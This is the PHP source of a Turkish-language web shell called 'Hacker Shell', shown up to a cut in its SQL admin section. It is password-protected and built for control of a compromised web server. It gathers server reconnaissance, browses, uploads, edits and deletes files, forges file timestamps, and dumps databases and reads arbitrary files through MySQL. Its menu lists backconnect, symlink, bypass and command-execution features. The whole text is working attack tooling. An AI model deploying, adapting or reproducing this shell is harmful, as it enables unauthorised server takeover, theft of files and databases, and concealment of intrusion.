<?
error_reporting(7);
    @set_magic_quotes_runtime(0);
    ob_start();
    $mtime     = explode(' ', microtime());
    $starttime = $mtime[1] + $mtime[0];
    define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)) . '/');
    define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
    define('IS_COM', class_exists('COM') ? 1 : 0);
    define('IS_GPC', get_magic_quotes_gpc());
    $dis_func = get_cfg_var('disable_functions');
    define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
    @set_time_limit(0);
    foreach (array(
        '_GET',
        '_POST'
    ) as $_request) {
        foreach ($$_request as $_key => $_value) {
            if ($_key{0} != '_') {
                if (IS_GPC) {
                    $_value = s_array($_value);
                }
                $$_key = $_value;
            }
        }
    }
    $admin                 = array();
    $admin['check']        = true;
    $admin['pass']         = '1431tamer';
    $admin['cookiepre']    = '';
    $admin['cookiedomain'] = '';
    $admin['cookiepath']   = '/';
    $admin['cookielife']   = 86400;
    if ($charset == 'utf8') {
        header("content-Type: text/html; charset=utf-8");
    } elseif ($charset == 'big5') {
        header("content-Type: text/html; charset=big5");
    } elseif ($charset == 'gbk') {
        header("content-Type: text/html; charset=gbk");
    } elseif ($charset == 'latin1') {
        header("content-Type: text/html; charset=iso-8859-2");
    }
    $self      = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
    $timestamp = time();
    if ($action == "logout") {
        scookie('kyobin', '', -86400 * 365);
        p('<meta http-equiv="refresh" content="0;URL=' . $self . '">');
        p('<body background=black>');
        exit;
    }
    if ($admin['check']) {
        if ($doing == 'login') {
            if ($admin['pass'] == $password) {
                scookie('kyobin', $password);
                            //Passwd Bypass Read
    eval(gzinflate(base64_decode('')));
                           
                p('<meta http-equiv="refresh" content="2;URL=' . $self . '">');
                p('<body bgcolor=black>
    <BR><BR><div align=center><font color=yellow face=tahoma size=2>Hacker Shell - Yukleniyor..<BR><img src=http://t3.gstatic.com/images?q=tbn:ANd9GcRFIQy9oLc9jMWmDY_N_sxjWPyusUWC4igwK2lqBm68aDGcSfKPPA></div>');
                exit;
            } else {
                $err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Password incorrect, Please try again!!!</blink><BR></font></div></td></tr></table>';
                echo $err_mess;
            }
        }
        if ($_COOKIE['kyobin']) {
            if ($_COOKIE['kyobin'] != $admin['pass']) {
                loginpage();
            }
        } else {
            loginpage();
        }
    }
    $errmsg = '';
    if ($action == 'phpinfo') {
        if (IS_PHPINFO) {
            phpinfo();
        } else {
            $errmsg = 'phpinfo() function has non-permissible';
        }
    }
    if ($doing == 'downfile' && $thefile) {
        if (!@file_exists($thefile)) {
            $errmsg = 'The file you want Downloadable was nonexistent';
        } else {
            $fileinfo = pathinfo($thefile);
            header('Content-type: application/x-' . $fileinfo['extension']);
            header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
            header('Content-Length: ' . filesize($thefile));
            @readfile($thefile);
            exit;
        }
    }
    if ($doing == 'backupmysql' && !$saveasfile) {
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        $table  = array_flip($table);
        $result = q("SHOW tables");
        if (!$result)
            p('<h2>' . mysql_error() . '</h2>');
        $filename = basename($_SERVER['HTTP_HOST'] . '_MySQL.sql');
        header('Content-type: application/unknown');
        header('Content-Disposition: attachment; filename=' . $filename);
        $mysqldata = '';
        while ($currow = mysql_fetch_array($result)) {
            if (isset($table[$currow[0]])) {
                $mysqldata .= sqldumptable($currow[0]);
            }
        }
        mysql_close();
        exit;
    }
    if ($doing == 'mysqldown') {
        if (!$dbname) {
            $errmsg = ' dbname';
        } else {
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            if (!file_exists($mysqldlfile)) {
                $errmsg = 'The file you want Downloadable was nonexistent';
            } else {
                $result = q("select load_file('$mysqldlfile');");
                if (!$result) {
                    q("DROP TABLE IF EXISTS tmp_angel;");
                    q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                    q("LOAD DATA LOCAL INFILE '" . addslashes($mysqldlfile) . "' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                    $result = q("select content from tmp_angel");
                    q("DROP TABLE tmp_angel");
                }
                $row = @mysql_fetch_array($result);
                if (!$row) {
                    $errmsg = 'Load file failed ' . mysql_error();
                } else {
                    $fileinfo = pathinfo($mysqldlfile);
                    header('Content-type: application/x-' . $fileinfo['extension']);
                    header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
                    header("Accept-Length: " . strlen($row[0]));
                    echo $row[0];
                    exit;
                }
            }
        }
    }
    ?>
     
     
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>.:: Hacker Shell ::. </title>
    <style type="text/css">
    body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}
     
    a {color: #808080;text-decoration:none;}
    a:hover{color: #f00;text-decoration:underline;}
    .alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
    .alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
    .focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
    .fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
    .fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
    .head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
    .head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
    .head td span{font-weight:normal;}
    form{margin:0;padding:0;}
    h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
    ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
    u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
    input, textarea, button
    {
            font-size: 9pt;
            color: #ccc;
            font-family: verdana, sans-serif;
            background-color: #202020;
            border-left: 1px solid #74A202;
            border-top: 1px solid #74A202;
            border-right: 1px solid #74A202;
            border-bottom: 1px solid #74A202;
    }
    select
    {
            font-size: 8pt;
            font-weight: normal;
            color: #ccc;
            font-family: verdana, sans-serif;
            background-color: #202020;
    }
     
    </style>
    </style>
    <script type="text/javascript">
    function CheckAll(form) {
            for(var i=0;i<form.elements.length;i++) {
                    var e = form.elements[i];
                    if (e.name != 'chkall')
                    e.checked = form.chkall.checked;
        }
    }
    function $(id) {
            return document.getElementById(id);
    }
    function goaction(act){
            $('goaction').action.value=act;
            $('goaction').submit();
    }
    </script>
    </head>
    <body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=http://i.hizliresim.com/Gn61ZN.gif>
    <div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
                                    <table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
                                            <tr>
                                                    <td align="center" valign=center>
                                     <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
                                       Yukleniyor <img src="http://i382.photobucket.com/albums/oo263/vnhacker/loading.gif">
                                      </div>
                                    </td>
                                            </tr>
                                    </table>
    </div>
     <script>
     var ld=(document.all);
      var ns4=document.layers;
     var ns6=document.getElementById&&!document.all;
     var ie4=document.all;
      if (ns4)
            ld=document.loading;
     else if (ns6)
            ld=document.getElementById("loading").style;
     else if (ie4)
            ld=document.all.loading.style;
      function init()
     {
     if(ns4){ld.visibility="hidden";}
     else if (ns6||ie4) ld.display="none";
     }
     </script>
    <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr class="head_small">
                    <td  width=100%>
                    <table width=100%><tr class="head_small"><td  width=86px><p><a title=" .:: Warning ! Shell is used to refer not to hack ::. " href="';$self;;echo '"><img src=http://i.hizliresim.com/rLWdkM.png width="100" height="100"></a></p>
                    </td>
                    <td>
               
                    <span style="float:left;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?> | Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> | Senin IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>
              | <a href="#" target="_blank"><?php echo str_replace('.','','Hacker Shell');?> </a> | <a href="javascript:goaction('logout');"><font color=red>Cikis</font></a></span> <br />
     
                    <?php
    $curl_on  = @function_exists('curl_version');
    $mysql_on = @function_exists('mysql_connect');
    $mssql_on = @function_exists('mssql_connect');
    $pg_on    = @function_exists('pg_connect');
    $ora_on   = @function_exists('ocilogon');
    echo (($safe_mode) ? ("Safe Mod: <b><font color=green>ON</font></b> - ") : ("Safe Mod: <b><font color=red>OFF</font></b> - "));
    echo "PHP version: <b>" . @phpversion() . "</b> - ";
    echo "cURL: " . (($curl_on) ? ("<b><font color=green>ON</font></b> - ") : ("<b><font color=red>OFF</font></b> - "));
    echo "MySQL: <b>";
    $mysql_on = @function_exists('mysql_connect');
    if ($mysql_on) {
        echo "<font color=green>ON</font></b> - ";
    } else {
        echo "<font color=red>OFF</font></b> - ";
    }
    echo "MSSQL: <b>";
    $mssql_on = @function_exists('mssql_connect');
    if ($mssql_on) {
        echo "<font color=green>ON</font></b> - ";
    } else {
        echo "<font color=red>OFF</font></b> - ";
    }
    echo "PostgreSQL: <b>";
    $pg_on = @function_exists('pg_connect');
    if ($pg_on) {
        echo "<font color=green>ON</font></b> - ";
    } else {
        echo "<font color=red>OFF</font></b> - ";
    }
    echo "Oracle: <b>";
    $ora_on = @function_exists('ocilogon');
    if ($ora_on) {
        echo "<font color=green>ON</font></b>";
    } else {
        echo "<font color=red>OFF</font></b><BR>";
    }
    echo "Disable functions : <b>";
    if ('' == ($df = @ini_get('disable_functions'))) {
        echo "<font color=green>NONE</font></b><BR>";
    } else {
        echo "<font color=red>$df</font></b><BR>";
    }
    echo "<font color=white>Bilgi</font>: " . @substr(@php_uname(), 0, 120) . "<br>";
    echo "<font color=white>Server</font>: " . @substr($SERVER_SOFTWARE, 0, 120) . " - <font color=white>id</font>: " . @getmyuid() . "(" . @get_current_user() . ") - uid=" . @getmyuid() . " (" . @get_current_user() . ") gid=" . @getmygid() . "(" . @get_current_user() . ")<br>";
    ?></td></tr></table></td>
            </tr>
            <tr class="alt1">
                    <td  width=10%><a href="javascript:goaction('file');">Dosyalar</a> |
                            <a href="javascript:goaction('sqladmin');">MySQL</a>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('dumper');">DB Dump</a><?php
    }
    ?> |
                            <a href="javascript:goaction('changepas');">Changer</a>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('etcpwd');">Kullanicilar</a> <?php
    }
    ?>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('error.log');">CGI Telnet</a><?php
    }
    ?>
                <?php
    if (!IS_WIN) {
    ?> | <a href="error/error.log" target="_blank">CGI Telnet Ac</a><?php
    }
    ?>
                <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('symroot');">Symlink Root</a><?php
    }
    ?>
                <?php
    if (!IS_WIN) {
    ?> | <a href="sym/" target="_blank">Symlink Root Ac</a><?php
    }
    ?>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('bypass');">ByPass</a><?php
    }
    ?>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('backconnect');">Backconnect</a><?php
    }
    ?>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('command');">Komut Calistir</a> <?php
    }
    ?>
                            <?php
    if (!IS_WIN) {
    ?> | <a href="javascript:goaction('leech');"><font color="red"><strong>VIP Tools </strong></font></a><?php
    }
    ?>
                </td>
            </tr>
    </table>
    <table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <?php
    formhead(array(
        'name' => 'goaction'
    ));
    makehide('action');
    formfoot();
    $errmsg && m($errmsg);
    !$dir && $dir = '.';
    $nowpath = getPath(SA_ROOT, $dir);
    if (substr($dir, -1) != '/') {
        $dir = $dir . '/';
    }
    $uedir = ue($dir);
    if (!$action || $action == 'file') {
        $dir_writeable = @is_writable($nowpath) ? 'Yazilabilir' : 'Yazilamaz';
        if ($doing == 'deldir' && $thefile) {
            if (!file_exists($thefile)) {
                m($thefile . ' Dizin Bulunamadi');
            } else {
                m('Dizini Sil ' . (deltree($thefile) ? basename($thefile) . ' Basarili' : 'Hata'));
            }
        } elseif ($newdirname) {
            $mkdirs = $nowpath . $newdirname;
            if (file_exists($mkdirs)) {
                m('Zaten Ayni Dizin Var');
            } else {
                m('Dizin Olusturuldu ' . (@mkdir($mkdirs, 0777) ? 'Basarili' : 'Basarisiz'));
                @chmod($mkdirs, 0777);
            }
        } elseif ($doupfile) {
            m('Dosya Yukleme ' . (@copy($_FILES['uploadfile']['tmp_name'], $uploaddir . '/' . $_FILES['uploadfile']['name']) ? 'Basarili' : 'Basarisiz'));
        } elseif ($editfilename && $filecontent) {
            $fp = @fopen($editfilename, 'w');
            m('Dosya Kaydetme Islemi ' . (@fwrite($fp, $filecontent) ? 'Basarili' : 'Basarisiz'));
            @fclose($fp);
        } elseif ($pfile && $newperm) {
            if (!file_exists($pfile)) {
                m('Orjinal Dosya Yok!');
            } else {
                $newperm = base_convert($newperm, 8, 10);
                m('Permisyon Ayarlari                       ' . (@chmod($pfile, $newperm) ? 'Basarili' : 'Basarisiz'));
            }
        } elseif ($oldname && $newfilename) {
            $nname = $nowpath . $newfilename;
            if (file_exists($nname) || !file_exists($oldname)) {
                m($nname . ' aynisi var yada orjinal dosya yok');
            } else {
                m(basename($oldname) . ' renamed ' . basename($nname) . (@rename($oldname, $nname) ? ' Basarili' : 'Basarisiz'));
            }
        } elseif ($sname && $tofile) {
            if (file_exists($tofile) || !file_exists($sname)) {
                m('aynisi var yada orjinal dosya yok');
            } else {
                m(basename($tofile) . ' copied ' . (@copy($sname, $tofile) ? basename($tofile) . ' Basarili' : 'Basarisiz'));
            }
        } elseif ($curfile && $tarfile) {
            if (!@file_exists($curfile) || !@file_exists($tarfile)) {
                m('aynisi var yada orjinal dosya yok');
            } else {
                $time = @filemtime($tarfile);
                m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? 'Basarili' : 'Basarisiz'));
            }
        } elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
            if (!@file_exists($curfile)) {
                m(basename($curfile) . ' does not exist');
            } else {
                $time = strtotime("$year-$month-$day $hour:$minute:$second");
                m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? 'Basarili' : 'Basarisiz'));
            }
        } elseif ($doing == 'downrar') {
            if ($dl) {
                $dfiles = '';
                foreach ($dl as $filepath => $value) {
                    $dfiles .= $filepath . ',';
                }
                $dfiles = substr($dfiles, 0, strlen($dfiles) - 1);
                $dl     = explode(',', $dfiles);
                $zip    = new PHPZip($dl);
                $code   = $zip->out;
                header('Content-type: application/octet-stream');
                header('Accept-Ranges: bytes');
                header('Accept-Length: ' . strlen($code));
                header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_Files.tar.gz');
                echo $code;
                exit;
            } else {
                m('Dosyalari Seciniz');
            }
        } elseif ($doing == 'delfiles') {
            if ($dl) {
                $dfiles = '';
                $succ   = $fail = 0;
                foreach ($dl as $filepath => $value) {
                    if (@unlink($filepath)) {
                        $succ++;
                    } else {
                        $fail++;
                    }
                }
                m('Silindi >> Basarili ' . $succ . ' Basarisiz ' . $fail);
            } else {
                m('Dosyalari Seciniz');
            }
        }
        formhead(array(
            'name' => 'createdir'
        ));
        makehide('newdirname');
        makehide('dir', $nowpath);
        formfoot();
        formhead(array(
            'name' => 'fileperm'
        ));
        makehide('newperm');
        makehide('pfile');
        makehide('dir', $nowpath);
        formfoot();
        formhead(array(
            'name' => 'copyfile'
        ));
        makehide('sname');
        makehide('tofile');
        makehide('dir', $nowpath);
        formfoot();
        formhead(array(
            'name' => 'rename'
        ));
        makehide('oldname');
        makehide('newfilename');
        makehide('dir', $nowpath);
        formfoot();
        formhead(array(
            'name' => 'fileopform'
        ));
        makehide('action');
        makehide('opfile');
        makehide('dir');
        formfoot();
        $free = @disk_free_space($nowpath);
        !$free && $free = 0;
        $all = @disk_total_space($nowpath);
        !$all && $all = 0;
        $used         = $all - $free;
        $used_percent = @round(100 / ($all / $free), 2);
        p('<font color=yellow face=tahoma size=2><B>Dosya Manager</b> </font> Bos Alan: <font color=red>' . sizecount($all) . '</font> te <font color=red>' . sizecount($free) . '</font> (<font color=red>' . $used_percent . '</font>% Kullaniliyor)</font>');
    ?><table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
      <form action="" method="post" id="godir" name="godir">
      <tr>
        <td nowrap>Directory (<?php
        echo $dir_writeable;
    ?>, <?php
        echo getChmod($nowpath);
    ?>)</td>
            <td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php
        echo $nowpath;
    ?>" type="text" style="width:100%;margin:0 8px;"></td>
        <td nowrap><input class="bt" value="GO" type="submit"></td>
      </tr>
      </form>
    </table>
    <script type="text/javascript">
    function createdir(){
            var newdirname;
            newdirname = prompt('Dizin Ismi:', '');
            if (!newdirname) return;
            $('createdir').newdirname.value=newdirname;
            $('createdir').submit();
    }
    function fileperm(pfile){
            var newperm;
            newperm = prompt('Dosya:'+pfile+'\n Yeni nitelik:', '');
            if (!newperm) return;
            $('fileperm').newperm.value=newperm;
            $('fileperm').pfile.value=pfile;
            $('fileperm').submit();
    }
    function copyfile(sname){
            var tofile;
            tofile = prompt('Dosya:'+sname+'\n object file (fullpath):', '');
            if (!tofile) return;
            $('copyfile').tofile.value=tofile;
            $('copyfile').sname.value=sname;
            $('copyfile').submit();
    }
    function rename(oldname){
            var newfilename;
            newfilename = prompt('Former file name:'+oldname+'\n new filename:', '');
            if (!newfilename) return;
            $('rename').newfilename.value=newfilename;
            $('rename').oldname.value=oldname;
            $('rename').submit();
    }
    function dofile(doing,thefile,m){
            if (m && !confirm(m)) {
                    return;
            }
            $('filelist').doing.value=doing;
            if (thefile){
                    $('filelist').thefile.value=thefile;
            }
            $('filelist').submit();
    }
    function createfile(nowpath){
            var filename;
            filename = prompt('Dosya Ismi:', '');
            if (!filename) return;
            opfile('editfile',nowpath + filename,nowpath);
    }
    function opfile(action,opfile,dir){
            $('fileopform').action.value=action;
            $('fileopform').opfile.value=opfile;
            $('fileopform').dir.value=dir;
            $('fileopform').submit();
    }
    function godir(dir,view_writable){
            if (view_writable) {
                    $('godir').view_writable.value=1;
            }
            $('godir').dir.value=dir;
            $('godir').submit();
    }
    </script>
       <?php
        tbhead();
        p('<form action="' . $self . '" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
        p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $dir . '" type="hidden" /><input name="dir" value="' . $dir . '" type="hidden" /></div>');
        p('<a href="javascript:godir(\'' . $_SERVER["DOCUMENT_ROOT"] . '\');">Anadizin</a>');
        if ($view_writable) {
            p(' | <a href="javascript:godir(\'' . $nowpath . '\');">Hepsini Goster</a>');
        } else {
            p(' | <a href="javascript:godir(\'' . $nowpath . '\',\'1\');">Yazilabilirlige Bak </a>');
        }
        p(' | <a href="javascript:createdir();">Dizin Olustur</a> | <a href="javascript:createfile(\'' . $nowpath . '\');">Dosya Olustur</a>');
        if (IS_WIN && IS_COM) {
            $obj = new COM('scripting.filesystemobject');
            if ($obj && is_object($obj)) {
                $DriveTypeDB = array(
                    0 => 'Unknow',
                    1 => 'Removable',
                    2 => 'Fixed',
                    3 => 'Network',
                    4 => 'CDRom',
                    5 => 'RAM Disk'
                );
                foreach ($obj->Drives as $drive) {
                    if ($drive->DriveType == 2) {
                        p(' | <a href="javascript:godir(\'' . $drive->Path . '/\');" title="Size:' . sizecount($drive->TotalSize) . '&#13;Free:' . sizecount($drive->FreeSpace) . '&#13;Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
                    } else {
                        p(' | <a href="javascript:godir(\'' . $drive->Path . '/\');" title="Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
                    }
                }
            }
        }
        p('</td></tr></form>');
        p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
        $dirdata  = array();
        $filedata = array();
        if ($view_writable) {
            $dirdata = GetList($nowpath);
        } else {
            $dirs = @opendir($dir);
            while ($file = @readdir($dirs)) {
                $filepath = $nowpath . $file;
                if (@is_dir($filepath)) {
                    $dirdb['filename']    = $file;
                    $dirdb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                    $dirdb['dirchmod']    = getChmod($filepath);
                    $dirdb['dirperm']     = getPerms($filepath);
                    $dirdb['fileowner']   = getUser($filepath);
                    $dirdb['dirlink']     = $nowpath;
                    $dirdb['server_link'] = $filepath;
                    $dirdb['client_link'] = ue($filepath);
                    $dirdata[]            = $dirdb;
                } else {
                    $filedb['filename']    = $file;
                    $filedb['size']        = sizecount(@filesize($filepath));
                    $filedb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                    $filedb['filechmod']   = getChmod($filepath);
                    $filedb['fileperm']    = getPerms($filepath);
                    $filedb['fileowner']   = getUser($filepath);
                    $filedb['dirlink']     = $nowpath;
                    $filedb['server_link'] = $filepath;
                    $filedb['client_link'] = ue($filepath);
                    $filedata[]            = $filedb;
                }
            }
            unset($dirdb);
            unset($filedb);
            @closedir($dirs);
        }
        @sort($dirdata);
        @sort($filedata);
        $dir_i = '0';
        foreach ($dirdata as $key => $dirdb) {
            if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
                $thisbg = bg();
                p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
                p('<td><a href="javascript:godir(\'' . $dirdb['server_link'] . '\');">' . $dirdb['filename'] . '</a></td>');
                p('<td nowrap>' . $dirdb['mtime'] . '</td>');
                p('<td nowrap>--</td>');
                p('<td nowrap>');
                p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirchmod'] . '</a> / ');
                p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>');
                p('<td nowrap><a href="javascript:dofile(\'deldir\',\'' . $dirdb['server_link'] . '\',\'Are you sure will delete ' . $dirdb['filename'] . '? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\'' . $dirdb['server_link'] . '\');">Rename</a></td>');
                p('</tr>');
                $dir_i++;
            } else {
                if ($dirdb['filename'] == '..') {
                    p('<tr class=fout>');
                    p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\'' . getUpPath($nowpath) . '\');">Parent Directory</a></td>');
                    p('</tr>');
                }
            }
        }
        p('<tr bgcolor="green" stlye="border-top:1px solid gray;border-bottom:1px solid gray;"><td colspan="6" height="5"></td></tr>');
        p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
        makehide('action', 'file');
        makehide('thefile');
        makehide('doing');
        makehide('dir', $nowpath);
        $file_i = '0';
        foreach ($filedata as $key => $filedb) {
            if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
                $fileurl = str_replace(SA_ROOT, '', $filedb['server_link']);
                $thisbg  = bg();
                p('<tr class="fout" onmouseover="this.className=\focus\;" onmouseout="this.className=\fout\;">');
                p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl[' . $filedb['server_link'] . ']"></td>');
                p('<td><a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a></td>');
                p('<td nowrap>' . $filedb['mtime'] . '</td>');
                p('<td nowrap>' . $filedb['size'] . '</td>');
                p('<td nowrap>');
                p('<a href="javascript:fileperm(\'' . $filedb['server_link'] . '\');">' . $filedb['filechmod'] . '</a> / ');
                p('<a href="javascript:fileperm(\'' . $filedb['server_link'] . '\');">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>');
                p('<td nowrap>');
                p('<a href="javascript:dofile(\'downfile\',\'' . $filedb['server_link'] . '\');">Down</a> | ');
                p('<a href="javascript:copyfile(\'' . $filedb['server_link'] . '\');">Copy</a> | ');
                p('<a href="javascript:opfile(\'editfile\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
                p('<a href="javascript:rename(\'' . $filedb['server_link'] . '\');">Rename</a> | ');
                p('<a href="javascript:opfile(\'newtime\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Time</a>');
                p('</td></tr>');
                $file_i++;
            }
        }
        p('<tr class="fout1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Download Select</a> - <a href="javascript:dofile(\'delfiles\');">Delete </a></td><td colspan="4" align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
        p('</form></table>');
    } // end dir
     
     
    ?><script type="text/javascript">
    function mysqlfile(doing){
            if(!doing) return;
            $('doing').value=doing;
            $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
            $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
            $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
            $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
            $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
            $('mysqlfile').charset.value=$('dbinfo').charset.value;
            $('mysqlfile').submit();
    }
    </script>
    <?php
    if ($action == 'sqladmin') {
        !$dbhost && $dbhost = 'localhost';
        !$dbuser && $dbuser = 'root';
        !$dbport && $dbport = '3306';
        $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
        if (isset($dbhost)) {
            $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
        }
        if (isset($dbuser)) {
            $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
        }
        if (isset($dbpass)) {
            $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
        }
        if (isset($dbport)) {
            $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
        }
        if (isset($dbname)) {
            $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
        }
        if (isset($charset)) {
            $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
        }
        if ($doing == 'backupmysql' && $saveasfile) {
            if (!$table) {
                m('Please choose the table');
            } else {
                dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                $table = array_flip($table);
                $fp    = @fopen($path, 'w');
                if ($fp) {
                    $result = q('SHOW tables');
                    if (!$result)
                        p('<h2>' . mysql_error() . '</h2>');
                    $mysqldata = '';
                    while ($currow = mysql_fetch_array($result)) {
                        if (isset($table[$currow[0]])) {
                            sqldumptable($currow[0], $fp);
                        }
                    }
                    fclose($fp);
                    $fileurl = str_replace(SA_ROOT, '', $path);
                    m('Database has success backup to <a href="' . $fileurl . '" target="_blank">' . $path . '</a>');
                    mysql_close();
                } else {
                    m('Backup failed');
                }
            }
        }
        if ($insert && $insertsql) {
            $keystr = $valstr = $tmp = '';
            foreach ($insertsql as $key => $val) {
                if ($val) {
                    $keystr .= $tmp . $key;
                    $valstr .= $tmp . "'" . addslashes($val) . "'";
                    $tmp = ',';
                }
            }
            if ($keystr && $valstr) {
                dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
            }
        }
        if ($update && $insertsql && $base64) {
            $valstr = $tmp = '';
            foreach ($insertsql as $key => $val) {
                $valstr .= $tmp . $key . "='" . addslashes($val) . "'";
                $tmp = ',';
            }
            if ($valstr) {
                $where = base64_decode($base64);
                dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
            }
        }
        if ($doing == 'del' && $base64) {
            $where      = base64_decode($base64);
            $delete_sql = "DELETE FROM $tablename WHERE $where";
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
        }
        if ($tablename && $doing == 'drop') {
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            if (q("DROP TABLE $tablename")) {
                m('Drop table of success');
                $tablename = '';
            } else {
                m(mysql_error());
            }
        }
        $charsets = array(
            '' => 'Default',
            'gbk' => 'GBK',
            'big5' => 'Big5',
            'utf8' => 'UTF-8',
            'latin1' => 'Latin1'
        );
